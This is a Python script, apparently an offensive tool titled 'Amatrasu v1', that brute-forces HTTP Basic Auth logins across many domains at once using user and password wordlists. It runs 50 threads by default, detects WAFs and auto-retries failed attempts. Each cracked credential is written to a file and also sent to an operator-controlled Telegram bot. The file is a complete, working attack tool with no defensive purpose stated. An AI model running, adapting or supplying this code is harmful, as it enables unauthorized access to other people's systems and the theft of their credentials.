#!/usr/bin/env python3
import argparse
import base64
import requests
import sys
import subprocess
from pathlib import Path
import concurrent.futures
import threading
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------------------------
# Config
# ---------------------------
TELEGRAM_TOKEN = "TELEGRAM_TOKEN_HERE"
TELEGRAM_CHAT_ID = "TELEGRAM_CHAT_ID_HERE" # Example: -1002838604754
TELEGRAM_TOPIC_SUCCESS = None
TELEGRAM_TOPIC_ERROR = None
ERROR_CREDS = []
ERROR_LOCK = threading.Lock()

# ---------------------------
# Session Management
# ---------------------------
def create_session():
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"})
    return session

def get_session():
    return create_session()

# ---------------------------
# Helpers
# ---------------------------
def send_telegram(text: str, topic_id: int = None):
    try:
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}
        if topic_id:
            data["message_thread_id"] = topic_id
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", data=data, timeout=3)
    except:
        pass

def detect_waf(url: str, session: requests.Session) -> str:
    try:
        r = session.get(url, timeout=6, verify=False)
        headers = " ".join(f"{k}:{v}".lower() for k, v in r.headers.items())
        if any(x in headers for x in ["cf-ray", "cloudflare", "akamai", "fastly", "x-sucuri"]):
            return "WAF Detected (Heuristic)"
    except:
        pass
    try:
        proc = subprocess.run(["wafw00f", url], capture_output=True, text=True, timeout=6)
        if "behind" in proc.stdout.lower():
            return proc.stdout.split("behind", 1)[1].split("WAF", 1)[0].strip()
    except:
        pass
    return "No WAF"

def build_auth(user: str, pwd: str):
    return {"Authorization": "Basic " + base64.b64encode(f"{user}:{pwd}".encode()).decode()}

def save_success(domain: str, user: str, pwd: str, status: int):
    with open("SUCCESS.txt", "a") as f:
        f.write(f"{domain} | {user}:{pwd} | Status: {status}\n")

def save_error(user: str, pwd: str, error: str):
    with ERROR_LOCK:
        ERROR_CREDS.append((user, pwd, error))
    with open("ERRORS.txt", "a") as f:
        f.write(f"{user}:{pwd} | {error}\n")

def read_list(path):
    p = Path(path)
    if not p.exists():
        print(f"[!] Missing: {path}")
        return []
    return [l.strip() for l in p.read_text().splitlines() if l.strip() and not l.startswith("#")]

def read_errors():
    if not Path("ERRORS.txt").exists():
        return []
    creds = []
    with open("ERRORS.txt", "r") as f:
        for line in f:
            if ":" in line and "|" in line:
                cred = line.split("|")[0].strip()
                if ":" in cred:
                    u, p = cred.split(":", 1)
                    creds.append((u, p))
    return creds

# ---------------------------
# Brute task
# ---------------------------
def try_cred(domain: str, user: str, pwd: str, args, session: requests.Session, progress_counter, total_creds, silent: bool):
    try:
        headers = build_auth(user, pwd)
        r = session.get(domain, headers=headers, timeout=args.timeout, verify=not args.insecure, allow_redirects=True)
        status = r.status_code
        with progress_counter['lock']:
            progress_counter['count'] += 1
            current = progress_counter['count']
        if not silent:
            print(f"user: {user:<18} password: {pwd:<18} -> {status}")
        if status != 401:
            msg = f"SUCCESS\nDomain: {domain}\nCreds: {user}:{pwd}\nStatus: {status}"
            print(msg)
            save_success(domain, user, pwd, status)
            send_telegram(msg, TELEGRAM_TOPIC_SUCCESS)
            return True
        return False
    except Exception as e:
        err_msg = str(e)[:50]
        if not silent:
            print(f"user: {user:<18} password: {pwd:<18} -> ERROR: {err_msg}")
        save_error(user, pwd, err_msg)
        return False

# ---------------------------
# Brute Engine per Domain
# ---------------------------
def run_brute_on_domain(domain: str, users, passes, args, retry_mode=False, silent=False):
    global ERROR_CREDS
    ERROR_CREDS = []
    session = get_session()
    domain = domain.strip().rstrip("/")
    if not domain.startswith("http"):
        domain = "https://" + domain

    # Initial 401 check
    try:
        r = session.get(domain, timeout=args.timeout, verify=not args.insecure)
        if r.status_code != 401:
            if not silent:
                print(f"[{domain}] [{r.status_code}] Not Basic Auth protected → Skipping")
            session.close()
            return False
    except Exception as e:
        if not silent:
            print(f"[{domain}] [!] Cannot reach: {e}")
        session.close()
        return False

    if not retry_mode and not silent:
        print(f"[WAF] {detect_waf(domain, session)}")

    source = read_errors() if retry_mode else [(u, p) for u in users for p in passes]
    total = len(source)
    if total == 0:
        return False

    if not silent:
        print(f"[+] {'Retry' if retry_mode else 'Brute'} {domain}: {total} attempts → {args.threads} threads")
    else:
        print(f"[+] Starting {domain}: {total} attempts")

    progress_counter = {'count': 0, 'lock': threading.Lock()}
    success_found = False

    def cred_generator():
        for u, p in source:
            yield u, p
            time.sleep(0.001)

    gen = cred_generator()

    # use getattr to avoid SyntaxError because "continue" is a keyword
    continue_flag = getattr(args, "continue", False)

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = set()
        initial_fill = min(args.threads * 2, total, 1000)
        for _ in range(initial_fill):
            try:
                u, p = next(gen)
                futures.add(pool.submit(try_cred, domain, u, p, args, session, progress_counter, total, silent))
            except StopIteration:
                break

        while futures:
            done, futures = concurrent.futures.wait(
                futures,
                timeout=1,
                return_when=concurrent.futures.FIRST_COMPLETED
            )

            current = progress_counter['count']
            print(f"\rProgress [{domain}]: {current}/{total} | Active: {len(futures)}", end="", flush=True)

            for future in done:
                if future.result():
                    success_found = True
                    if not continue_flag:
                        print(f"\n[!] Success found! Stopping brute on {domain} (use --continue to keep going)")
                        # Cancel all running tasks
                        for f in futures:
                            f.cancel()
                        # Drain generator to prevent refill
                        try:
                            while True: next(gen)
                        except StopIteration:
                            pass
                        futures.clear()
                        break

            # Break out of main loop if success and not continuing
            if not continue_flag and success_found:
                break

            # Refill
            for _ in range(len(done)):
                try:
                    u, p = next(gen)
                    futures.add(pool.submit(try_cred, domain, u, p, args, session, progress_counter, total, silent))
                except StopIteration:
                    break

    print()  # New line
    session.close()
    return success_found


# ---------------------------
# Main
# ---------------------------
def banner():
    print(r"""
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣦⣀⠀⠀⠀⠀⠀⠀⢲⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡆⠀⠀⠀⠀⠀⠀⠀⠛⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣷⣤⠀⠀⠀⠀⠀⢻⣿⣷⣄⢀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⣄⠀⠀⠀⠀⣿⣿⣿⣷⠱⣆⠀⠀⠀⢀⣾⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣽⣿⡆⠀⠀⠀⢸⣿⣞⣿⣧⢸⣷⣤⠀⢸⣿⣯⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡟⢰⣿⡷⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⣿⣦⡄⠀⠀⠀⠀⢻⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣟⣾⣿⠀⠀⠀⣼⣿⡏⣿⣿⠀⣿⣿⣗⠺⣿⣳⣿⣧⠀⠀⠀⠀⠀⠀⠀⣴⣿⡟⠀⣸⣿⡟⣽⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣆⠀⠀⠀⠀⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣦⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣯⢿⣿⡇⠀⣰⣿⡿⢸⣿⡿⠀⣼⣿⣻⡦⣿⣯⢿⣿⡆⠀⠀⠀⠀⢀⣾⣿⣿⠀⢠⣿⡿⢱⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⢯⣿⠀⠀⢠⠀⣼⣿⣻⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠀⠀⠀⠀⠀⣰⣿⣿⣞⣿⣿⠃⢀⣿⡿⣡⣿⡿⠃⢀⣿⣿⣽⣷⢹⣿⣻⢿⣿⡄⠀⠀⢀⣾⣿⢿⡇⠀⣾⣿⣱⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠁⢀⡿⢰⣿⣣⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⡄⠀⠀⠀⢰⣿⣿⣻⣼⣿⡿⠀⢸⣿⢣⣿⡿⠁⣠⣿⣿⡟⣾⣿⢈⣿⣯⣟⣿⣷⠀⠀⣸⣿⣟⣿⡇⠀⣿⣧⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣳⣿⡟⠀⣾⡇⢸⣷⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡄⠀⢠⣿⣿⢯⣳⣿⣿⣦⣄⠘⣿⣿⡿⠁⣴⣿⣿⢯⣽⣿⡟⢀⣿⣷⢯⣿⣿⡇⠀⣿⣿⣽⣻⣿⠀⣿⣷⣿⠇⠀⠀⠀⠀⣀⠀⠀⢀⣼⣿⣿⣳⢿⣿⠁⣰⣿⣇⢸⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣾⠇⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⢿⣷⠀⣿⣿⢯⣟⣼⣿⡇⢻⣿⣧⠘⣿⠃⣼⣿⡿⡽⣞⣿⣿⠁⢸⣿⣟⣮⢿⣿⡇⠀⣿⣿⢶⣻⣿⣇⠘⣿⣿⠀⠀⢀⣴⡿⠁⠀⣠⣿⢱⣿⣯⣽⣻⣿⠀⣿⡿⣿⡄⢻⣧⠀⠀⠀⠀⠀⠀⣴⣾⡟⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣰⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⢿⡇⢰⣿⣯⡟⣼⣿⣿⠁⠘⣿⣽⣧⠈⢰⣿⣯⡷⣛⣿⣿⠃⠀⣼⣿⣿⢼⣻⣿⡇⠀⢺⣿⡿⣼⣻⣿⣦⠘⠇⠀⣠⣿⡿⠁⠀⣰⣿⡟⢸⣿⣳⢾⡽⣿⣇⢸⣿⡿⣿⣆⠙⠀⠀⠀⠀⢀⣾⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡿⣿⠃⣿⣟⣾⢡⡿⣿⡟⠀⠀⢿⣯⢿⡇⣼⣿⣞⡇⣿⣿⣯⠀⣼⣿⣿⠏⣾⣿⣟⣰⡇⠘⣿⣿⣳⣭⢿⣿⣧⠀⢠⣿⣿⡃⠀⢰⣿⡿⡇⠸⣿⣯⡇⢻⣿⣿⣯⣿⣿⣿⣿⣷⡀⠀⠀⢀⣿⣿⣻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠐⣿⣯⣿⣇⠱⣆⡀⠀⠀⠀⣸⣿⡿⣽⡿⢸⣿⢯⡇⢸⣟⣯⣟⠀⠀⣻⣿⣻⣿⢼⣷⣻⠄⢸⣿⣿⣿⣿⡿⠏⣸⣿⣿⣷⣿⡅⠀⢸⣿⣷⣏⣾⣻⣿⡆⢸⣿⢿⡅⠀⣾⣿⣻⣿⠐⣿⣿⣻⡄⠻⣽⣿⣯⣿⣷⣻⢿⣿⡆⠀⢸⣿⣟⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⣧⡀⠀⢻⣿⣾⣿⣆⠹⣿⣆⠀⢠⣿⣿⡽⣿⡇⢸⣿⢯⡇⢸⣯⢿⣿⡀⣠⣿⣟⡷⣿⢸⣿⡽⣇⠀⡹⠾⠟⠋⢀⣾⣿⣿⣻⣿⢿⡆⠀⢈⣿⣿⢾⡘⣷⣻⣷⣸⣿⢿⣧⠀⣿⣿⣽⣿⡆⠘⣿⣿⣽⡀⢹⡾⣿⣯⢻⣿⣯⢿⣿⡄⢸⣿⣯⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣷⡀⠸⣿⣷⣻⣿⡀⣿⣿⡧⢼⣿⢷⣻⣿⡇⢹⣿⣟⡆⠈⣿⣻⢿⣷⣿⡿⣭⣿⡟⠘⣿⣟⣯⠀⠐⡀⢂⢠⣿⣿⣿⠍⣿⣿⢿⣿⣦⣼⣿⣟⣾⠇⢹⣯⢿⡏⣿⡿⣿⡀⢺⣿⣞⣿⣿⣦⣹⣿⣯⠇⠀⣿⣻⣿⠀⣿⣯⣟⣿⣷⠈⣿⣿⢯⡿⣿⣧⡀⠀⠀⠀⢀⣀⣤
⠀⠀⠀⣿⣿⣇⠀⣿⣷⣻⣿⡇⢹⣯⣿⣼⣿⡇⣿⣿⡇⠘⣿⣯⡗⠀⢜⢯⡿⡽⣯⢷⣯⣿⡷⢨⣿⣟⣾⠀⡼⠁⡌⣾⣿⣿⡏⠀⣿⣿⢯⡿⣿⣟⣿⡽⣾⠀⠐⣯⣿⣟⢿⣿⢿⣷⡜⣿⣯⠺⣟⡿⣿⣟⡿⡀⠀⡿⣽⣿⠀⣿⣿⢞⣿⡟⣲⡿⢻⣿⣳⢟⣿⣿⡄⠀⣴⣿⣿⠃
⠀⠀⣼⣿⣯⡇⣼⣿⢷⣻⣿⠀⣽⡿⣽⣿⣿⣽⢸⣿⣿⣤⣿⣯⡟⢧⠈⢢⡙⡿⠁⣾⢿⣿⡇⢸⣿⣟⣾⠰⡇⣸⠱⣟⣿⣷⡀⠀⣿⣿⣳⢻⡽⣿⡳⣽⢣⠇⢈⡷⣿⣏⠸⣿⣯⢿⣿⡹⣿⣷⡈⠙⠳⠟⠐⠀⠀⣿⣿⣇⣼⣿⣯⢿⣿⣷⣿⡇⠘⣿⣯⡛⣾⣿⣟⢰⣿⢿⡟⠀
⠀⣼⣿⣿⣿⣽⣿⡿⣫⣿⡇⢰⣿⣟⣿⡏⣿⣿⣆⠹⢿⡿⣟⣷⡻⢸⡄⠀⢻⠃⠀⣿⣿⣿⣀⣾⣿⣽⡎⢸⠁⡏⠀⣿⣻⣿⣿⣾⣿⡿⣽⠃⢻⡷⣽⢋⡎⠀⣴⡿⣿⡿⢀⣿⣟⢺⣿⣧⠹⣿⣿⣄⠀⠙⡆⠀⠀⣿⣿⣿⣿⡟⣾⣿⣿⣿⡽⣇⠀⣹⣿⣽⠸⣿⣿⢨⣿⣿⣷⠀
⣼⣿⣟⣿⣿⣿⣿⢃⣿⣿⣷⣿⣿⢞⣿⡇⢸⣿⣽⡄⠠⡙⢿⣯⡗⢨⠀⠀⡘⠰⡰⠘⣿⢿⣿⢿⣻⡞⠁⡾⠀⢱⡐⠈⠷⣯⣟⣯⣟⡽⢏⠀⢨⡿⢁⡞⠀⢰⣿⣿⣿⠃⢈⣿⣿⡃⣿⣿⠄⢻⣿⣽⠀⠀⢧⡀⡆⢹⣾⡽⠃⣾⣿⡿⢸⣿⣽⣿⣦⣿⣿⡏⢘⣷⣿⢸⣿⢿⣿⡄
⣿⣿⢽⣿⣿⣿⢾⠀⢿⣻⢿⣯⠏⣾⣿⡇⠘⣿⣯⢿⠀⠙⣆⠹⠇⣤⠇⡄⡃⠀⡇⠀⢈⠙⠙⢋⡁⠀⠠⢹⠀⣄⠑⡌⠀⡀⠉⡈⢀⣰⡾⠀⣼⣣⠋⠇⡀⢺⣯⣿⡟⠀⢀⣿⣟⡇⣿⣿⡇⢸⣿⣾⠁⡆⢸⡇⢸⠈⡻⠀⢸⣟⣿⡇⠸⣿⣷⠻⣿⣿⠟⠀⣸⣿⣿⣾⣿⢯⣿⡧
⣿⣿⢸⣿⣿⣿⣻⡇⠈⠻⣿⠁⠨⡷⣿⣷⣤⣽⣿⣻⠅⠀⠘⡆⣸⠏⡰⠀⡇⡄⠘⡄⠂⠈⢀⠀⠲⣀⠀⣽⠀⡈⡦⡈⠢⢑⠀⣴⠞⢁⡠⢀⡽⠁⢸⠀⠀⢹⣿⣿⡇⢀⣾⣿⣿⠁⢿⣽⣿⣿⣿⠟⢠⠃⡘⢧⠈⢫⠀⠀⠸⣯⣿⣷⣤⣿⣿⡇⠘⣋⠆⢠⣿⣿⣿⣿⠏⣾⣿⡇
⠹⣿⣧⠻⣿⢿⣷⣻⣄⠘⣄⠀⢀⠿⣽⣻⢿⡿⣯⠟⠀⠀⠀⡼⠃⣴⠇⣸⠁⢸⢂⠘⢔⠀⡀⠀⡄⠻⣄⠘⣇⢡⠀⡉⠢⡀⠉⠁⡔⠋⠁⠨⠁⢀⢾⡀⠆⠘⣷⢿⣿⣿⣿⡿⠃⠀⢊⢉⡛⠋⠁⡠⠃⢠⠃⡘⠠⡀⢷⡀⡀⠻⢽⣿⣿⣿⠟⠀⠐⠁⣠⠿⠿⠛⠋⢁⣰⣿⣿⠁
⠀⠹⣿⣷⣌⡙⠛⠽⠷⢧⡈⠢⣄⠲⢍⡛⠳⠛⠁⢊⣠⠞⠋⣰⡟⢁⣴⠇⢀⠂⣦⣉⠢⢄⡑⠄⠈⣶⢄⣁⠙⠤⡂⠹⢦⣈⠓⠈⢠⡶⣼⡄⡶⣹⣧⣳⡘⠰⢌⡛⠚⢓⢫⠴⠁⠀⠈⠁⠀⢐⡭⠔⢒⡇⢠⣇⢠⣆⠈⣷⣈⠢⢄⡠⢉⠀⠀⣀⠄⠘⠁⠀⠀⣠⣴⡿⣿⡿⠋⠀
⠀⠀⠈⠙⠿⢽⣷⣶⣤⣤⣌⣦⣈⣳⣶⣤⣤⣴⣠⣭⣴⣶⣛⣧⣴⣾⣩⣴⣾⣧⣝⣯⣷⣶⣭⣗⣤⣈⣛⣶⣭⣝⣃⣂⣀⣉⣻⣦⣔⣿⣮⣅⣁⣻⣾⣽⣻⣧⣤⣥⣤⣠⣄⣤⣠⣤⣤⣴⣶⣯⣤⣶⣯⣴⣟⣿⣮⣟⣷⣮⣟⣿⣶⣶⣖⣶⣾⣥⣖⣶⣲⣮⣷⠿⠞⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠁⠀⠀⠀⠀⠀⠁⠀⠀⠀⠁⠀⠀⠀⠁⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠁⠈⠀⠀⠀⠁⠈⠀⠁⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          
          Amatrasu v1
    """)

def main():
    parser = argparse.ArgumentParser(description="HTTP Basic Auth Brute Forcer - Multi-Domain, Stop/Continue on Success")
    parser.add_argument("-d", "--domain", help="Single target domain (e.g. https://example.com)")
    parser.add_argument("--domains", help="File containing list of domains (one per line)")
    parser.add_argument("--users", default="Username_List.txt", help="User list file")
    parser.add_argument("--passes", default="Password_List.txt", help="Password list file")
    parser.add_argument("--threads", type=int, default=50, help="Threads per domain (30-50 recommended)")
    parser.add_argument("--timeout", type=float, default=5.0, help="Request timeout")
    parser.add_argument("--insecure", action="store_true", help="Disable SSL verification")
    parser.add_argument("--use-wafw00f", action="store_true", help="Use wafw00f for WAF detection")
    parser.add_argument("--silent", action="store_true", help="Show only progress and results")
    parser.add_argument("--retry", action="store_true", help="Retry only failed credentials from ERRORS.txt")
    parser.add_argument("-c", "--continue", action="store_true", help="Continue brute-forcing even after success")
    args = parser.parse_args()

    if not args.silent:
        banner()

    # Load domains
    if args.domains:
        domains = read_list(args.domains)
        if not domains:
            sys.exit(1)
    elif args.domain:
        domains = [args.domain]
    else:
        print("[!] Provide --domain or --domains")
        sys.exit(1)

    # Load credentials
    if args.retry:
        error_creds = read_errors()
        if not error_creds:
            print("[!] No errors to retry.")
            return
        users = [u for u, p in error_creds]
        passes = [p for u, p in error_creds]
        print(f"[+] Retrying {len(error_creds)} failed attempts across {len(domains)} domain(s)...")
    else:
        users = read_list(args.users)
        passes = read_list(args.passes)
        if not users or not passes:
            sys.exit(1)

    # Process each domain
    overall_success = False
    for domain in domains:
        success = run_brute_on_domain(domain, users, passes, args, retry_mode=args.retry, silent=args.silent)
        if success:
            overall_success = True
        # Auto-retry failed creds on this domain if needed
        if not args.retry and not success and Path("ERRORS.txt").exists():
            error_count = len(read_errors())
            if error_count > 0 and error_count < len(users) * len(passes):
                if not args.silent:
                    print(f"\n[+] Auto-retrying {error_count} failed attempts on {domain}...")
                time.sleep(1)
                run_brute_on_domain(domain, [], [], args, retry_mode=True, silent=args.silent)

    print("[+] All done." if overall_success else "[-] No success. Check ERRORS.txt")
    sys.exit(0 if overall_success else 1)

if __name__ == "__main__":
    main()